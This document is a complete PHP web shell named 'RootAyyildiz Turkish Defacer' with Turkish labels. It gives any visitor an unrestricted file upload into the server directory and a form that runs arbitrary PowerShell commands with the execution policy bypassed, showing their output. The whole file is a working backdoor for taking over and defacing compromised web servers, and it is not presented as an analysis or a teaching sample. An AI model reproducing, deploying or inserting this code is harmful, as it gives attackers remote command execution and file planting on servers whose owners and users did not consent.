<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>RootAyyildiz Turkish Defacer - Dosya Yukleme ve Komut Calastirma</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; }
        .container { margin-top: 20px; }
        input[type="text"], textarea { width: 80%; }
        textarea { height: 200px; }
        .banner {
            background-color: black;
            color: white;
            padding: 20px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="banner">
        <h1>RootAyyildiz Turkish Defacer</h1>
    </div>
    
    <div class="container">
        <h2>Dosya Yukleme ve PowerShell Komut Calistirma</h2>

        <?php
        $currentDir = getcwd();

        if (isset($_FILES['uploadFile'])) {
            $uploadFile = $currentDir . '/' . basename($_FILES['uploadFile']['name']);
            if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadFile)) {
                echo "Dosya basariyla yüklendi: " . htmlspecialchars(basename($_FILES['uploadFile']['name'])) . "<br>";
            } else {
                echo "Dosya yüklenirken bir hata olustu.<br>";
            }
        }

        if (isset($_POST['runCommand'])) {
            $command = $_POST['command'];

            $powershellCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; cd '$currentDir'; $command\"";
            $output = shell_exec($powershellCommand);

            if ($output) {
                echo "<pre>Komut Ciktisi:<br>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";
            } else {
                echo "<pre>Herhangi bir cikti bulunamadi veya komut calistirilamadi.</pre>";
            }
        }
        ?>

        <form method="post" enctype="multipart/form-data">
            <label for="uploadFile">Dosya Yukle:</label>
            <input type="file" name="uploadFile" required>
            <button type="submit">Yukle</button>
        </form>

        <br><br>

        <form method="post">
            <label for="command">Komut Calistir (PowerShell):</label>
            <input type="text" name="command" placeholder="PowerShell komutunu girin" required>
            <button type="submit" name="runCommand">Komut Calistir</button>
        </form>

        <br><br>

        <textarea readonly><?php if (isset($output)) echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8'); ?></textarea>
    </div>
</body>
</html>
